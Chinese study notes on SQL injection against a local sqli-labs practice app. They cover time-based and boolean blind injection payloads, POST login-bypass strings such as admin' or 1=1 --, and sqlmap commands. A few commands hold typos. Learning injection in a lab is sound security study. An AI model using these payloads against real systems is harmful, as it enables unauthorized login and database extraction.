eg1.
SELECT * FROM users WHERE username = ('admin'') and password = 'admin'
' 1'' LIMIT 0,1 '
eg2.
SELECT * FROM users WHERE id = '1'' limit 0,1
' 1'' LIMIT 0,1 '

4. 盲注介绍
Blind SQL(盲注)是注入攻击的其中一种,向数据库发生true或false这样的问题,并根据应用程 序返回的信息判断结果。这种攻击的出现是因为应用程序配置为只显示常规错误,但并没有 解决SQL注入存在的代码问题

5. 盲注种类
1.布尔类型
2.时间的盲注

5.1 GET基于时间的盲注
if(ascii(substr(database(),1,1))=115,1,sleep(3))        # 1  (ascii s=115)
# SUBSTR(str,pos,len) 位置/长度 s=>115 =115
当数据库名第一个字母的ASCII码等于115时,执行一次sleep(3)函数等待3秒
    判断是否存在注入点
    http://127.0.0.1/sqli/Less-5/?id=1' and if(1=0,1,sleep(3)) --+      #延迟3秒，返回错误则存在注入点
    判断数据库长度
    http://127.0.0.1/sqli/Less-5/?id=1' and if(length(database())=8, sleep(3),1） --+    #延迟3秒，说明数据库长度就是8
    判断数据库名字
    http://127.0.0.1/sqli/Less-5/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3))


5.2 GET基于Boolean的盲注
基于布尔的盲注,我们通常采用下面的办法猜解字符串

        SQL语句	                        显示状态	            说明状态
((select length(database()))>5)	           正常	                  true
((select length(database()))>10)	      无显示	              false
((select length(database()))>7)	            正常	               true
((select length(database()))>8)	           无显示	               false

        SQL语句	                                显示状态	      说明状态
((select ascii(substr(database(),1,1)))>75)	    正常	            true
((select ascii(substr(database(),1,1)))>100)	正常	            true
((select ascii(substr(database(),1,1)))>113)	正常	            true
((select ascii(substr(database(),1,1)))>119)	无显示	            false
((select ascii(substr(database(),1,1)))>116)	无显示	            false
((select ascii(substr(database(),1,1)))>114)	正常	            true
((select ascii(substr(database(),1,1)))>115)	无显示	            false

sql语句
    select length(database());
    select substr(database(),1,1);
    select ascii(substr(database(),1,1));
    select ascii(substr(database(),1,1)) > N;
    select ascii(substr(database(),1,1)) = N;
    select ascii(substr(database(),1,1)) < N;
get基于布尔的盲注，实际应用：
    SELECT LENGTH(DATABASE()) =8; 	#1 True
    SELECT LENGTH(DATABASE()) =8; 	#0 False
    SELECT * FROM users WHERE id = 1 AND LENGTH(DATABASE())=8;      #不能用and连接两个select
    127.0.01/sqli/Less-5/?id=1' and length(database())=8 --+
    127.0.01/sqli/Less-5/?id=1' and if(length(database())=8,sleep(3),1) --+
    127.0.01/sqli/Less-5/?id=1' and (SELECT ASCII(sustr(DATABASE(),1,1))=115) --+
基于时间的盲注
python sqlmap.py -u "http://127.0.0.1/sqli/Less-5/?id=1" --technique T --dbs
基于布尔的盲注
python sqlmap.py -u "http://127.0.0.1/sqli/Less-5/?id=1" --technique B --dbs



5.4 sqlmap安全测试
python sqlmap.py -u "http://127.0.0.1/sqli/Less-8/?id=1" --technique T --dbs

5.5 POST基于错误的注入
特点:
    1.POST请求不能被缓存下来
    2.POST请求不会保存在浏览器浏览记录中
    3.以POST请求的URL无法保存为浏览器书签
    4.POST请求没有长度限制

5.6 POST基于错误单引号注入
注入点位置发生了变化,在浏览器中已经无法直接进行查看与修改。可以借助对应的插件完 成修改任务
http://127.0.0.1/sqli/Less-11/
' admin' LIMIT 0,1 '
参数： uname=admin&passwd=admin&submit=Submit
sql语句猜测：select * from xxx where uname = 'xxx' and passwd = 'xxx';
            select * from xxx where uname = 'xxx' OR 1=1 --' and passwd = 'xxx';
该网址输入 admin' or 1=1 --, 123也可成功登入

5.7 POST基于错误双引号注入
注入点位置发生了变化,在浏览器中已经无法直接进行查看与修改。可以借助对应的插件完 成修改任务
    http://127.0.0.1/sqli/Less-12/
    \123 登陆报错 ' 123") LIMIT0,1 '
    select * from xxx where uname = ("name") OR 1=1 --' and passwd = 'xxx';
    select * from xxx where uname = ("xxx") OR 1=1 --") and passwd = 'xxx';
    输入admin") or 1=1 -- 密码随便输入也可登陆成功

5.8 sqlmap安全测试
python sqlmap.py  -r target.txt  -p passwd  --technique E
-r targer.txt文件中是当前网址的请求,加上发送的参数
sqlmap:
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-12/" --data-"uname-admin&passwd-123" --banner

5.9 POST基于时间的盲注
在存在注入点POST提交的参数后加  http://127.0.0.1/sqli/Less-15/
and (select (if(length(database())>5,sleep(5),null))) --
如果执行的页面响应时间大于5秒,肯定就存在注入,并且对应的SQL语句执行
username = admin'and (select (if(length(database())>5,sleep(5),null))) --
username = admin' and(length(database())=8) -- 密码： 123（sql语句把密码注释了，输入任何都可）

5.10. POST基于布尔的盲注 http://127.0.0.1/sqli/Less-15/
在存在注入点POST提交的参数后加入if判断语句

select length(database());
    Username= admin' and length(database()>10)
select substr(database(),1,1);
select ascii(substr(database(),1,1));
select ascii(substr(database(),1,1)) > N;
select ascii(substr(database(),1,1)) = N;
select ascii(substr(database(),1,1)) < N;
sqlmap:
    python sqlmap.py -u "http://127.0.0.1/sqli/Less-15/" --data="uname=admin&passwd=123" --current db --technique T


https://blog.csdn.net/wdsj_xh/article/details/97511285
